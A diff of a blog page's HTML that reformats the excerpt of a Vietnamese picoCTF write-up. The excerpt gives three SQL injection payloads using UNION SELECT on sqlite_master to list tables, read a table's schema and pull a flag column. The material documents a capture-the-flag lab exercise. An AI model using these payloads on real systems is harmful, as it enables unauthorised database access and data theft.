@@ -375,9 +375,12 @@ This article does not have a corresponding language version
         >
       </div>
       <h2 class="post-title">Picoctf</h2>
-      <article class="post-article">SQLILấy các bảng bằng payload như sau a&rsquo; union select 1,name,3 from sqlite_master where type=&lsquo;table&rsquo;&ndash; -
-Kiểm tra bảng more_table a&rsquo; union select 1,sql,3 from sqlite_master where name=&lsquo;more_table&rsquo;&ndash; -
-KIểm tra cột flag trong bảng more_table a&rsquo; …</article>
+      <article class="post-article">SQLILấy các bảng bằng payload như sau
+a' union select 1,name,3 from sqlite_master where type='table'-- -
+Kiểm tra bảng more_table
+a' union select 1,sql,3 from sqlite_master where name='more_table'-- -
+KIểm tra cột flag trong bảng more_table
+a' union select flag,2,3 from more_table-- - …</article>
     </div>
   </div>
 </div>
